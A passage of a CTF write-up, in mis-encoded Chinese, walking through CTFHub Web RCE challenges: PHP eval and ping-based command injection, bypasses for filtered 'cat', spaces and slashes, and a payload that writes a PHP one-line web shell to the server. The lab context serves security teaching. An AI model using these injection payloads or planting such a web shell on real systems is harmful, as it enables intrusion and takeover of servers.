flag<br></code></pre></td></tr></table></figure><p>ã€€4.åæ–œæ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c\at fl\ag<br></code></pre></td></tr></table></figure><p>   5.Shell ç‰¹æ®Šå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-variable">$@t</span> flag<br>ca<span class="hljs-variable">$1t</span> flag<br></code></pre></td></tr></table></figure><p>   6.é€šé…ç¬¦ç»•è¿‡</p><p>å¸¸ç”¨çš„é€šé…ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">* <span class="hljs-comment">#åŒ¹é…ä»»æ„é•¿åº¦å­—ç¬¦</span><br>? <span class="hljs-comment">#åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</span><br>[list] <span class="hljs-comment">#åŒ¹é…æŒ‡å®šèŒƒå›´(list)å†…çš„ä»»æ„å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</span><br>[^list] <span class="hljs-comment">#åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</span><br>[!list]  <span class="hljs-comment">#[^list]</span><br>&#123;str1,str2&#125;<span class="hljs-comment">#åŒ¹é…str1æˆ–è€…str2</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br>cat fl[a-z]?<br>cat fla* <br>cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br></code></pre></td></tr></table></figure><h1 id="ç›¸å…³å‘½ä»¤æ‰§è¡Œå˜é‡"><a href="#ç›¸å…³å‘½ä»¤æ‰§è¡Œå˜é‡" class="headerlink" title="ç›¸å…³å‘½ä»¤æ‰§è¡Œå˜é‡"></a>ç›¸å…³å‘½ä»¤æ‰§è¡Œå˜é‡</h1><p>PHPä»£ç æ‰§è¡Œå˜é‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span>å‡½æ•°ã€<br>preg_replaceã€<br>create_functionå‡½æ•°ã€<br>array_mapã€<br>call_user_funcã€<br>assertã€<br>call_user_func_arrayã€<br>array_filterã€<br>uasor <br></code></pre></td></tr></table></figure><p>PHPä»£ç å‘½ä»¤æ‰§è¡Œå˜é‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">popenã€<br>proc_popenã€<br>passthruã€<br>systemå˜é‡ã€<br><span class="hljs-built_in">exec</span>å˜é‡ã€<br>shell_execã€<br>pcntl_execã€‚<br></code></pre></td></tr></table></figure><h1 id="CTFHub-Web-RCEç»ƒä¹ "><a href="#CTFHub-Web-RCEç»ƒä¹ " class="headerlink" title="CTFHub-Web-RCEç»ƒä¹ "></a>CTFHub-Web-RCEç»ƒä¹ </h1><h2 id="evalæ‰§è¡Œ"><a href="#evalæ‰§è¡Œ" class="headerlink" title="evalæ‰§è¡Œ"></a>evalæ‰§è¡Œ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201208153824782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹ä¸‹ä¸€çº§ç›®å½•,å‘ç°flag_23816æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls /&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020120918423712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨catå‘½ä»¤è¯»å–æ–‡ä»¶,æ‰¾åˆ°flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;cat /flag_23816&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201209184311919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//blog.csdn.net/Xxy605/article/details/107548841?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control</span><br></code></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ³¨å…¥-æ— è¿‡æ»¤"><a href="#å‘½ä»¤æ³¨å…¥-æ— è¿‡æ»¤" class="headerlink" title="å‘½ä»¤æ³¨å…¥-æ— è¿‡æ»¤"></a>å‘½ä»¤æ³¨å…¥-æ— è¿‡æ»¤</h2><p>è¿™æ˜¯ä¸€ä¸ªåœ¨çº¿æµ‹è¯•ç½‘ç»œå»¶è¿Ÿçš„å¹³å°ï¼Œè·¯ç”±å™¨ä¸­ç»å¸¸ä¼šè§åˆ°ã€‚æ— ä»»ä½•å®‰å…¨æªæ–½ï¼Œå°è¯•è·å– flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br><span class="hljs-variable">$res</span> = FALSE;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 &#123;<span class="hljs-variable">$_GET</span>[&#x27;ip&#x27;]&#125;&quot;</span>;<br>    <span class="hljs-built_in">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>pingä¸€ä¸‹127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20201210184652619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>å‘ç°äº†25900911724350.php<br><img src="https://img-blog.csdnimg.cn/20201211103127797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨catè¯»å–æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php<br></code></pre></td></tr></table></figure><p>æ— å›æ˜¾ï¼Œå¯èƒ½å­˜åœ¨å­—ç¬¦ç¼–ç æ— æ³•æ˜¾ç¤ºå‡ºæ¥<br><img src="https://img-blog.csdnimg.cn/20201210184802952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹ç½‘é¡µæºä»£ç <br><img src="https://img-blog.csdnimg.cn/20201211103237831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦ï¼Œé€šè¿‡base64çš„å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php|base64<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201211103751285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>base64è§£ç ï¼Œå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201210185039373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿˜å¯ä»¥å†™ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; a.php <br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>?ip=;ls</code>ï¼Œå‘ç°å†™å…¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201211104044953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>èšå‰‘è¿æ¥ï¼Œæ•°æ®è¿”å›ä¸ºç©º<br><img src="https://img-blog.csdnimg.cn/20201211104308449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éœ€è¦æ³¨æ„echoå‘½ä»¤ä¼šè°ƒç”¨<code>$_POST</code>å¯¼è‡´åŸå§‹æ–‡ä»¶ä¸­æ²¡æœ‰,ä¸€å¥è¯æœ¨é©¬é‡Œé¢ <code>$_POST</code> å‰åŠ ä¸Š  <code>\</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; b.php <br></code></pre></td></tr></table></figure><p>b.phpå†™å…¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èšå‰‘è¿æ¥æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤cat"><a href="#å‘½ä»¤æ³¨å…¥-è¿‡æ»¤cat" class="headerlink" title="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤cat"></a>å‘½ä»¤æ³¨å…¥-è¿‡æ»¤cat</h2><p>é¢˜ç›®æè¿°ï¼šè¿‡æ»¤äº†catå‘½ä»¤ä¹‹åï¼Œä½ è¿˜æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½è¯»åˆ° Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>å‘ç°äº†flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é¢˜ç›®è¯´è¿‡æ»¤äº†catï¼Œç»•è¿‡cat</p><ol><li> å•å¼•å·æˆ–åŒå¼•å·ç»•è¿‡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-string">&#x27;&#x27;</span>t flag_22422157929595.php<br>?ip=|ca<span class="hljs-string">&quot;&quot;</span>t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>åæ–œæ ç»•è¿‡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca\t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-variable">$@t</span>  flag_22422157929595.php<br>?ip=|ca<span class="hljs-variable">$1t</span>  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>linuxä¸­ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„å‘½ä»¤<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">catã€tacã€moreã€lessã€headã€tailã€file -fã€nlã€sedã€sortã€uniq<br><br>catï¼š ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>tacï¼š ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤ºï¼<br>nlï¼š æ˜¾ç¤ºçš„æ—¶å€™ï¼Œéšä¾¿è¾“å‡ºè¡Œå·ï¼<br>moreï¼š ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µï¼<br>headï¼š æŸ¥çœ‹å¤´å‡ è¡Œ<br>tailï¼š æŸ¥çœ‹å°¾å‡ è¡Œ<br>odï¼š ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ï¼<br>æœ€å¸¸ä½¿ç”¨çš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹çš„æŒ‡ä»¤å¯ä»¥è¯´æ˜¯ cat ï¼Œmore åŠ less äº†ï¼<br></code></pre></td></tr></table></figure></li></ol><p>   catè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å‘½ä»¤ï¼ŒèŠ±å¼Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|tac flag_22422157929595.php<br>?ip=|more flag_22422157929595.php<br>?ip=|less flag_22422157929595.php<br>?ip=|head flag_22422157929595.php<br>?ip=|tail flag_22422157929595.php<br>?ip=|file -f flag_22422157929595.php<br>?ip=|nl flag_22422157929595.php<br>?ip=|sed flag_22422157929595.php<br>?ip=|sort flag_22422157929595.php<br>?ip=|uniq flag_22422157929595.php<br></code></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç©ºæ ¼"><a href="#å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç©ºæ ¼"></a>å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç©ºæ ¼</h2><p>é¢˜ç›®æè¿°ï¼šè¿™æ¬¡è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½ èƒ½ç»•è¿‡å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæŸ¥è¯¢ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹flagæ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|cat flag_177172732728132.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨ä»¥ä¸‹å­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; ã€&lt;&gt;ã€%<span class="hljs-number">20</span>(space)ã€%<span class="hljs-number">09</span>(tab)ã€$IFS$<span class="hljs-number">9</span>ã€ $&#123;IFS&#125;ã€<span class="hljs-variable">$IFS</span>  <br></code></pre></td></tr></table></figure><p>æ–°çš„Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|cat<span class="hljs-variable">$&#123;IFS&#125;</span>flag_177172732728132.php<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç å³å¯å¾—åˆ°flag</p><h2 id="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"><a href="#å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h2><p>é¢˜ç›®æè¿°ï¼šè¿™æ¬¡è¿‡æ»¤äº†ç›®å½•åˆ†å‰²ç¬¦ / ï¼Œä½ èƒ½è¯»åˆ° flag ç›®å½•ä¸‹çš„ flag æ–‡ä»¶å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è€è§„çŸ©</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">linuxä¸­ï¼š%<span class="hljs-number">0</span>a ã€%<span class="hljs-number">0</span>d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||<br>windowsä¸­ï¼š%<span class="hljs-number">0</span>aã€&amp;ã€|ã€%<span 